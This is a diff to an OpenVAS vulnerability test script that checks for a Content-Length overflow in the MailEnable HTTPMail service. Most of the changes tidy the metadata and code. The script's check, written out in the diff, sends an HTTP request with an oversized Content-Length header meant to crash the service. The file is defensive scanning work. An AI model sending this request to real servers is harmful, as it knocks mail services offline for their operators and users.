@@ -1,5 +1,5 @@
 # OpenVAS Vulnerability Test
-# $Id: mailenable_httpmail_content_length_overflow.nasl 5390 2017-02-21 18:39:27Z mime $
+# $Id: mailenable_httpmail_content_length_overflow.nasl 5785 2017-03-30 09:19:35Z cfi $
 # Description: MailEnable HTTPMail Service Content-Length Overflow Vulnerability
 #
 # Authors:
@@ -37,31 +37,21 @@ tag_solution = "Upgrade to MailEnable Professional / Enterprise 1.2 or later or 
 the HTTPMail hotfix from 9th August 2004 found at
 http://www.mailenable.com/hotfix/";
 
-if (description) {
+if (description)
+{
   script_id(14655);
-  script_version("$Revision: 5390 $");
-  script_tag(name:"last_modification", value:"$Date: 2017-02-21 19:39:27 +0100 (Tue, 21 Feb 2017) $");
+  script_version("$Revision: 5785 $");
+  script_tag(name:"last_modification", value:"$Date: 2017-03-30 11:19:35 +0200 (Thu, 30 Mar 2017) $");
   script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
   script_tag(name:"cvss_base", value:"10.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
-
   script_bugtraq_id(10838);
   script_xref(name:"OSVDB", value:"8301");
-
-  name = "MailEnable HTTPMail Service Content-Length Overflow Vulnerability";
-  script_name(name);
- 
- 
-  summary = "Checks for Content-Length Overflow Vulnerability in MailEnable HTTPMail Service";
-  script_summary(summary);
- 
+  script_name("MailEnable HTTPMail Service Content-Length Overflow Vulnerability");
   script_category(ACT_DENIAL);
   script_tag(name:"qod_type", value:"remote_vul");
   script_copyright("This script is Copyright (C) 2004 George A. Theall");
-
-  family = "Web application abuses";
-  script_family(family);
-
+  script_family("Web application abuses");
   script_dependencies("gb_get_http_banner.nasl");
   script_mandatory_keys("MailEnable/banner");
   script_require_ports("Services/www", 8080);
@@ -72,24 +62,22 @@ if (description) {
   exit(0);
 }
 
-
 include("global_settings.inc");
 include("http_func.inc");
 include("http_keepalive.inc");
 
-
 port = get_http_port(default:8080);
-if (!get_port_state(port)) exit(0);
 if (http_is_dead(port:port)) exit(0);
 
+host = http_host_name(port:port);
 
 # Make sure banner's from MailEnable.
-banner = get_http_banner(port);
+banner = get_http_banner(port:port);
 if (banner && egrep(pattern:"^Server: .*MailEnable", string:banner)) {
   # Try to bring it down.
   req = string(
     "GET / HTTP/1.0\r\n",
-    "Host: ", get_host_name(), "\r\n",
+    "Host: ", host, "\r\n",
     "Content-Length: ", crap(length:100, data:"9"), "XXXX\r\n",
     "\r\n"
   );
